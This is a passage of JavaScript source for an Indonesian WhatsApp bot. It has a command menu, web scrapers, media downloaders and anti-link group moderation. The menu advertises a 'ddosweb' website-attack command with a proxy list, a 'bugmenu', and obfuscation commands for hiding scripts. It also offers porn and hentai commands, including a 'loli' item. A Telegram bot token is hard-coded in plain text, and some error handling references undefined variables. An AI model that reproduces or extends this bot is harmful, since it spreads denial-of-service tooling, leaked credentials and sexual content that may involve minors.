➤ nhentai/ncode (code hentai)
➤ xnxx/xnxxdl (link bokep xnxx)
➤ xvideos/xvideosdl (link bokep xvideos)
➤ tiktok (link)
➤ tiktok2 (Backup'an)
➤ tiktokmp3 (link)
➤ ttimg/tiktokslide/ttslide (link)
➤ igdl (link)
➤ igvid/igvideo (link video ig)
➤ igimg/igfoto (link foto ig)
➤ dlcapcut (link)
➤ twitter/twt/twtdl (Link Video Twitter)
➤ twtimg (Link foto Twitter)
➤ fbdl (Link Video Facebook)
➤ telestik (Link Stiker Telegram)
➤ tera/terabox (Link Terabox)
➤ mediafire
➤ gdrive
➤ git/gitclone
➤ mega
➤ play (cari lagu apa?)
➤ ytmp3 (link yt)
➤ ytmp4 (link yt)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 𝘼𝙉𝙄𝙈𝙀 )
━━━━━━━━━━━━━━━━━━━
➤ animeid (Judul Anime)
➤ animedl (tempel id anime)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙄 & 𝙀𝙉𝘾𝙃𝘼𝙉𝙏 )
━━━━━━━━━━━━━━━━━━━
➤ ai/openai4/chatgptv4
➤ blackbox
➤ nero/aibb
➤ chan
➤ bard/bardai
➤ bardimg (reply gambar + masukin teks)
➤ bingai
➤ bingimg
➤ bingimg2
➤ gemini
➤ mtk/aimtk (kirim soal mtk)
➤ simi
➤ remini (Reply Gambar)
➤ hd/4k (Reply Gambar)
➤ removebg (Reply Gambar)
➤ jadianime (Reply Gambar)
➤ jadikartun (Reply Gambar)
➤ jadigta (Reply Gambar)
➤ jadizombie (Reply Gambar)
➤ txtimg (Masukin teks Prompt)
➤ txtimg2 (Masukin teks Prompt)
➤ txtimg3 (Masukin teks Prompt)
➤ txtimg4 (Masukin teks Prompt)
➤ txtimg5 (Masukin teks Prompt)
➤ txtimg6 (Masukin teks Prompt)
➤ prodia (Masukin teks Prompt)
➤ simurg (Masukin teks Prompt)
➤ cartoon (Masukin teks Prompt)
➤ animedif/animediffusion (Masukin teks Prompt)
➤ animedif2/animediffusion2 (Masukin teks Prompt)
➤ sdxl (Masukin teks Prompt)
➤ dalle (Masukin teks Prompt)
➤ seaart (Masukin Yang Mau Dicari)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙍𝘼𝙉𝘿𝙊𝙈 𝘼𝙉𝙄𝙈𝙀 )
━━━━━━━━━━━━━━━━━━━
➤ loli
➤ neko
➤ waifu
➤ foto
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ enc/encsc (LOW)
➤ enc2/encsc2 (HIGH)
➤ carbon (Teks)
➤ npmsearch
➤ persamaankata/sinonim
➤ style/styletext
➤ ringtone
➤ kalkulator
➤ ss (screenshot web)
➤ googlemaps/gmaps
➤ lookup
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙕𝘾𝙊𝘿𝙀 𝙈𝙀𝙉𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ zcodequest
➤ zcodegen
➤ zcodebug
➤ zcoderef
➤ zcoderev
➤ zcodedoc
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘿𝘿𝙊𝙎 𝙒𝙀𝘽𝙎𝙄𝙏𝙀 )
━━━━━━━━━━━━━━━━━━━
➤ ddosweb ( Thanks to Shield )
➤ proxylist
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙋𝙀𝙉𝘾𝘼𝙍𝙄𝘼𝙉 )
━━━━━━━━━━━━━━━━━━━
➤ spotifysearch (search)
➤ xnxxsearch (search)
➤ xvideosearch (search)
➤ ytsearch (search)
➤ pinterest (search)
➤ google (search)
➤ img (Nyari foto bugil, Nezuko nude|jumlahnya)
➤ wallpaper (search)
➤ wallpaper2
➤ carihentai (Lu mo nyari apa?)
➤ nekopoi (Masukin Judul Nekopoi, Contoh: Majo wa kekkyoku sono kyaku)
➤ anime (Cari Sinopsis Anime)
➤ lirik (Judul lagu indo)
➤ lirik2 (Judul lagu luar negeri)
➤ search (Mencari Source Anime+Manga)
➤ searchmusik (Mencari Judul Musik)
➤ imdb (Cek Rating Film)
➤ wikipedia
➤ yandere (Query)
➤ png (Cari Apa yang mau di cari)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙇𝘼𝙏 𝘽𝘼𝙉𝙏𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ aksarajawa
➤ latin (translate aksara jawa)
➤ ocr (Ambil Teks Foto)
➤ brainly (Kirim Soal)
➤ ruangguru (kirim soal)
➤ pangkat
➤ akarquadrat
➤ translate ( [id] Teks )
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘽𝙐𝘼𝙏 𝙀𝙈𝘼𝙄𝙇 𝙍𝘼𝙉𝘿𝙊𝙈 )
━━━━━━━━━━━━━━━━━━━
➤ tempmail
➤ inboxemail/inboxmail (Masukin ID Email)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙎𝙏𝙄𝙆𝙀𝙍 )
━━━━━━━━━━━━━━━━━━━
➤ ttp
➤ ttp2
➤ ttp3
➤ ttp4
➤ ttp5
➤ attp
➤ attp2
➤ sticker
➤ emojimix (🙂+🥰)
➤ qc (Masukan Teks)
➤ smeme (reply gambar)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 )
━━━━━━━━━━━━━━━━━━━
➤ toimg
➤ take/wm
➤ toaudio
➤ tomp3
➤ tovideo/tomp4
➤ towav
➤ togif
➤ tovn
➤ tts/gtts (Masukin Teks)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙀𝘿𝙄𝙏 𝙎𝙊𝙐𝙉𝘿 )
━━━━━━━━━━━━━━━━━━━
➤ bass
➤ blown
➤ deep
➤ earrape
➤ fast
➤ slow
➤ fat
➤ nightcore
➤ reverse
➤ robot
➤ smooth
➤ squirrel
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙀𝘿𝙄𝙏 𝙑𝙊𝙇𝙐𝙈𝙀 )
━━━━━━━━━━━━━━━━━━━
➤ volaudio (Angka 1-10)
➤ volvideo (Angka 1-10
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙉𝙎𝙁𝙒 𝙈𝙀𝙉𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ hentai
➤ hneko
➤ trap
➤ yuri
➤ blowjob
➤ pussy
➤ cum
➤ femdom
➤ masturbation
➤ futanari
➤ ahegao
➤ bdsm
➤ oppai
➤ hentaivid
➤ paizuri
➤ hen (Random NSFW)
➤ fantox
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘽𝙔𝙋𝘼𝙎𝙎 𝙄𝙆𝙇𝘼𝙉 )
━━━━━━━━━━━━━━━━━━━
➤ bypassouo (anti iklan boss)
➤ bypassmirror (langsung ke inti)
━━━━━━━━━━━━━━━━━━━
➤ grupmenu (Owner)
➤ bugmenu (Owner)
➤ tqto (Thanks)
━━━━━━━━━━━━━━━
`
//tiktok new scrape
async function tryServer1(url) {
    // server 1 tiklydown.eu.org
    let tiklydownAPI = `https://api.tiklydown.eu.org/api/download?url=${url}`;
    let response = await axios.get(tiklydownAPI);
    return response.data;
}
//NHENTAI SCRAPE TEST
async function nhentaiScraper(id) {
	let uri = id ? `https://cin.guru/v/${+id}/` : 'https://cin.guru/'
	let html = (await axios.get(uri)).data
	return JSON.parse(html.split('<script id="__NEXT_DATA__" type="application/json">')[1].split('</script>')[0]).props.pageProps.data
}

function toPDF(images, opt = {}) {
	return new Promise(async (resolve, reject) => {
		if (!Array.isArray(images)) images = [images]
		let buffs = [], doc = new PDFDocument({ margin: 0, size: 'A4' })
		for (let x = 0; x < images.length; x++) {
			if (/.webp|.gif/.test(images[x])) continue
			let data = (await axios.get(images[x], { responseType: 'arraybuffer', ...opt })).data
			doc.image(data, 0, 0, { fit: [595.28, 841.89], align: 'center', valign: 'center' })
			if (images.length != x + 1) doc.addPage()
		}
		doc.on('data', (chunk) => buffs.push(chunk))
		doc.on('end', () => resolve(Buffer.concat(buffs)))
		doc.on('error', (err) => reject(err))
		doc.end()
	})
}
async function searchHentai(search) {
  return new Promise((resolve, reject) => {
    axios.get("https://hentai.tv/?s=" + search).then(async ({ data }) => {
      let $ = cheerio.load(data)
      let result = {}
      let res = []
      result.coder = 'rem-comp'
      result.result = res
      result.warning = "It is strictly forbidden to reupload this code, copyright © 2022 by rem-comp"

      $('div.flex > div.crsl-slde').each(function (a, b) {
        let _thumbnail = $(b).find('img').attr('src')
        let _title = $(b).find('a').text().trim()
        let _views = $(b).find('p').text().trim()
        let _url = $(b).find('a').attr('href')
        let hasil = { thumbnail: _thumbnail, title: _title, views: _views, url: _url }
        res.push(hasil)
      })

      resolve(result)
    }).catch(err => {
      console.log(err)
    })
  })
}
async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}
//SCRAPE WIKIPEDIA BY SHINCHAN
async function wikipedia(querry) {
  try {
    const link = await axios.get(`https://id.wikipedia.org/wiki/${querry}`)
    const $ = cheerio.load(link.data)
    let judul = $('#firstHeading').text().trim()
    let thumb = $('#mw-content-text').find('div.mw-parser-output > div:nth-child(1) > table > tbody > tr:nth-child(2) > td > a > img').attr('src') || `//k.top4top.io/p_2121ug8or0.png`
    let isi = []
    $('#mw-content-text > div.mw-parser-output').each(function (rayy, Ra) {
      let penjelasan = $(Ra).find('p').text().trim()
      isi.push(penjelasan)
    })
    for (let i of isi) {
      const data = {
        status: link.status,
        result: {
          judul: judul,
          thumb: 'https:' + thumb,
          isi: i
        }
      }
      return data
    }
  } catch (err) {
    var notFond = {
      status: link.status,
      Pesan: eror
    }
    return notFond
  }
}

//SCRAPE PINTEREST
async function pinterest(query) {
	if (query.match(URL_REGEX)) {
		let res = await fetch('https://www.expertsphp.com/facebook-video-downloader.php', {
			method: 'POST',
			body: new URLSearchParams(Object.entries({ url: query }))
		})
		let $ = cheerio.load(await res.text())
		let data = $('table[class="table table-condensed table-striped table-bordered"]').find('a').attr('href')
		if (!data) throw 'Can\'t download post :/'
		return data
	} else {
		let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`)
		let json = await res.json()
		let data = json.resource_response.data.results
		if (!data.length) throw `Query "${query}" not found :/`
		return data[~~(Math.random() * (data.length))].images.orig.url
	}
}

async function shortUrl(url) {
	return await (await fetch(`https://tinyurl.com/api-create.php?url=${url}`)).text()
}

//ENC SCRIPT
async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//TEST DOOD
const regexPattern = /(?:doodstream|dood|dooood|ds2play)(?:.*)\/(?:d\/|e\/)([A-z0-9]+)/;

async function generatePlayUrl(inputText) {
    const match = inputText.match(regexPattern);
    if (!match) {
        console.error("Input tidak sesuai dengan regex pattern.");
        throw new Error("Input tidak sesuai dengan regex pattern.");
    }

    const encryptedId = match[1];
    const apiUrl = `https://api.delivrjs.workers.dev/encrypt/${encryptedId}`;

    try {
        const response = await fetch(apiUrl);
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const data = await response.json();
        const playUrl = `https://xstreampro.pages.dev/play.html?id=${data.encryptId}&host=doodstream`;
        return playUrl;
    } catch (error) {
        console.error("Terjadi kesalahan dalam fetch:", error);
        throw error;
    }
}

//SCRAPE YANDERE by ShinChan
async function getYandeImage(query, page = '') {
  if (query.match(URL_REGEX)) {
    let res = await fetch(query);
    let html = await res.text();
    let $ = cheerio.load(html);
    let image = $('img').attr('src');
    if (!image) throw 'Can\'t fetch image :/';
    return image;
  } else {
    let apiUrl = `https://yande.re/post.json?tags=${query}`;
    if (page) {
      const pageNumber = parseInt(page);
      if (!isNaN(pageNumber) && pageNumber > 0) {
        apiUrl += `&page=${pageNumber}`;
      }
    }

    // Simulating in-progress fetching
    await new Promise((resolve) => setTimeout(resolve, 2000));

    let res = await fetch(apiUrl);
    let json = await res.json();
    if (json.length === 0) throw `Query "${query}" not found :/`;
    let data = json[~~(Math.random() * json.length)];
    if (!data) throw `Query "${query}" not found :/`;
    return data.file_url;
  }
}

//download Twitter
async function twitterDl(url) {
    const idMatch = /twitter\.com\/[^/]+\/status\/(\d+)/.exec(url);
    const id = idMatch ? idMatch[1] : null;
    if (!id) throw 'Invalid URL';
    const res = await fetch(`https://tweetpik.com/api/tweets/${id}`);
    if (res.status !== 200) throw res.statusText;
    const json = await res.json();
    if (json.media) {
        const media = await Promise.all(
            json.media.map(async (i) => {
                if (/video|animated_gif/.test(i.type)) {
                    const vids = await (await fetch(`https://tweetpik.com/api/tweets/${id}/video`)).json();
                    const vid = vids.variants.pop();
                    return {
                        url: vid.url,
                        type: i.type,
                    };
                } else {
                    return {
                        url: i.url,
                        type: i.type,
                    };
                }
            })
        );
        return {
            caption: json.text,
            media,
        };
    } else {
        throw 'No media found';
    }
}

//Scrape Telesticker BY SHINCHAN
async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) throw 'Enther your url telegram sticker'
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const hasil = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'shinchan',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            hasil.push(result)
        }
    resolve(hasil)
    })
}

//SCRAPE GOOGLE MAPS BY SHINCHAN
async function jarak(dari, ke) {
const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0';
    let html = (await axios.get(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`, {
        headers: {
            'User-Agent': userAgent
        }
    })).data;
    let $ = cheerio.load(html);
    let obj = {};

    let img = html.split("var s=\'")?.[1]?.split("\'")?.[0];
    obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split(',')[1], 'base64') : '';
    
    // ngambil waktu jarak
    obj.captions = [];
    $('div.BbbuR.uc9Qxb.uE1RRc').each((index, element) => {
        let caption = $(element).text()?.trim();
        obj.captions.push(caption);
    });

    return obj;
}

//TEST SCRAPE TO KARTUN BY SHINCHAN
async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
//ZCODE
async function fetchAndParse(payload, tool) {
    try {
        const url = 'https://zzzcode.ai/api/tools/' + tool;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload),
        });
        const input = await response.text();
        const match = input.match(/zzzredirectmessageidzzz:\s*([a-zA-Z0-9-]+)/);
        const id = match ? match[1] : null;

        const url2 = 'https://zzzcode.ai/api/tools/' + tool;
        const response2 = await fetch(url2, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                id
            })
        });

        const output = await response2.text();
        const lines = output
            .split('\n')
            .slice(1, -3)
        const parsedLines = lines.map(line => {
            if (line.startsWith('data: "')) {
                return JSON.parse(`{"msg": "${line.slice(7, -1)}"}`);
            }
            return JSON.parse(`{"msg": "${line}"}`);
        });
        return parsedLines.map(parsedLine => parsedLine.msg).join('')
    } catch (e) {
        return null
    }
}

//SCRAPE PERSAMAAN KATA BY SHINCHAN
function ArrClean(str) {
    return str.map((v, index) => ++index + ". " + v).join('\r\n')
}

async function Persamaan_Kata(kata) {
    const html = await axios.get("https://m.persamaankata.com/search.php?q=" + kata)
    const $ = cheerio.load(html.data)
    const h = []
    $("div.word_thesaurus > a").each(function(e, a) {
        h.push($(a).text());
    })
    const image = $("img#visual_synonym_img").attr("src")
    return {
        image: image,
        result: h
    }
}

//SCRAPE PIXIV BY SHINCHAN
async function pixivDl(query) {
	if (query.match(URL_REGEX)) {
	//	if (!/https:\/\/www.pixiv.net\/en\/artworks\/[0-9]+/i.test(query)) throw 'Invalid Pixiv Url'
		query = query.replace(/\D/g, '')
		let res = await pixiv.getIllustByID(query).catch(() => null)
		if (!res) throw `Pencarian "${query}" Tidak Ditemukan`
		let media = []
		for (let x = 0; x < res.urls.length; x++) media.push(await pixiv.download(new URL(res.urls[x].original)))
		return {
			artist: res.user.name, caption: res.title, tags: res.tags.tags.map(v => v.tag), media
		}
	} else {
		let res = await pixiv.getIllustsByTag(query)
		if (!res.length) throw `Pencarian "${query}" Tidak Di Temukan`
		res = res[~~(Math.random() * res.length)].id
		res = await pixiv.getIllustByID(res)
		let media = []
		for (let x = 0; x < res.urls.length; x++) media.push(await pixiv.download(new URL(res.urls[x].original)))
		return {
			artist: res.user.name, caption: res.title, tags: res.tags.tags.map(v => v.tag), media
		}
	}
}

//SCRAPE SSWEB BY SHINCHAN
async function ssweb(url, device = 'desktop') {
    return new Promise((resolve, reject) => {
        const base = 'https://www.screenshotmachine.com';
      
        // jika ingin screenshot tidak full, hapus saja simbol //
        // const param = {
        //     url: url,
        //     device: device,
        //     cacheLimit: 0
        // };
      
        const param = {
            url: url,
            device: device,
            full: 'on',
            cacheLimit: 0
        };
        
        axios({
            url: base + '/capture.php',
            method: 'POST',
            data: new URLSearchParams(Object.entries(param)),
            headers: {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
        }).then((data) => {
            const cookies = data.headers['set-cookie'];
            
            if (data.data.status == 'success') {
                axios.get(base + '/' + data.data.link, {
                    headers: {
                        'cookie': cookies.join('')
                    },
                    responseType: 'arraybuffer'
                }).then(({ data }) => {
                    const result = {
                        status: 200,
                        author: 'ShinChan',
                        result: data
                    };
                    resolve(result);
                });
            } else {
                reject({ status: 404, author: 'ShinChan', message: data.data });
            }
        }).catch(reject);
    });
}

//SEAART
const pagePre = 40;
const apiUrl = 'https://www.seaart.ai/api/v1/artwork/list';

const fetchData = async (requestData) => {
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestData),
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const {
            data
        } = await response.json();
        const items = data.items;

        if (!items || !Array.isArray(items) || items.length === 0) {
            throw new Error('No items found.');
        }
        const randomIndex = Math.floor(Math.random() * items.length);
        return items[randomIndex];
    } catch (error) {
        console.error('Error fetching data:', error);
        throw error;
    }
};
//FILEIO
const fileIO = async buffer => {
    const {
        ext,
        mime
    } = await fileTypeFromBuffer(buffer) || {}
    let form = new FormData()
    const blob = new Blob([buffer.toArrayBuffer()], {
        type: mime
    })
    form.append('file', blob, 'tmp.' + ext)
    let res = await fetch('https://file.io/?expires=1d', { // 1 Day Expiry Date
        method: 'POST',
        body: form
    })
    let json = await res.json()
    if (!json.success) throw json
    return json.link
}

function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
//YTMP3
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await connl.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//YTMP4
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
// DELAY FUNCTION
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
async function loading () {
var shinchanehe = [
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■□□□□□□□□□] 𝟷𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■□□□□□□□] 𝟹𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■■■□□□□□] 𝟻𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■■■■■□□□] 𝟾𝟶٪",
"『 ⎔ 𝙻𝚘𝚊𝚍𝚒𝚗𝚐... 』\n[■■■■■■■■■■] 𝟷𝟶𝟶٪",
"ʟᴏᴀᴅɪɴɢ sᴜᴄᴄᴇssғᴜʟ . . ."
]
let { key } = await conn.sendMessage(from, {text: 'Loading...'})//Pengalih isu

for (let i = 0; i < shinchanehe.length; i++) {
/*await delay(10)*/
a = await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
}
}
//RANDOM REACTION
/*conn.sendMessage(m.chat, {
          react: {
            text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','🥺','😜','👎'])}`,
            key: m.key,
          }})*/
//auto restart bot
function start() {
   let args = [path.join(__dirname, 'shinchan.js'), ...process.argv.slice(2)]
   console.log([process.argv[0], ...args].join('\n'))
   let p = spawn(process.argv[0], args, {
         stdio: ['inherit', 'inherit', 'inherit', 'ipc']
      })
      .on('message', data => {
         if (data == 'reset') {
            console.log('Restarting Bot...')
            p.kill()
            start()
            delete p
         }
      })
      .on('exit', code => {
         console.error('Exited with code:', code)
         if (code == '.' || code == 1 || code == 0) start()
      })
}      
//auto off
if (global.autoOff) {
if (command) {
conn.sendPresenceUpdate('unavailable', from)
}
}
//auto typing
if (global.autoTyping) {
if (command) {
conn.sendPresenceUpdate('composing', from)
}
}
//auto recording
if (global.autoRecord) {
if (command) {
conn.sendPresenceUpdate('recording', from)
}
}
//auto reading
if (global.autoReading) {
if (command) {
conn.readMessages([m.key])
}
}
// itunya
      if (!conn.public) {
         if (!m.key.fromMe && !isCreator) return
      }
      if (m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
         try {
            await conn.ev.emit("viewOnceMessage", m);
         } catch (err) {
            console.error(util.format(err))
         }
      }
      
      //chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }
        
/*let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}*/

//Grup Only By ShinChan_Kawaii
if(isCmd && !m.isGroup && !isCreator && grup_only){
          paycall("Bot hanya bisa digunakan dalam grup\nChat : wa.me//+6282134110253 untuk meminta akses grup")
          return
        }
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
//conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

//antilink all by ShinChan
if (AntiLinkAll)
   if (budy.match("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin sudah kirim linknya, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink Instagram
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin sudah mengirimkan link instagram, admin bebas mengirimkan link apa saja😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah mengirimkan link instagram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink Channel Wa by ShinChan
if (AntiLinkChannel)
   if (budy.includes("https://whatsapp.com/channel/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Saluran WhatsApp Link Detected 」\`\`\`\n\nAdmin sudah mengirimkan link Saluran WhatsApp, admin bebas mengirimkan link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
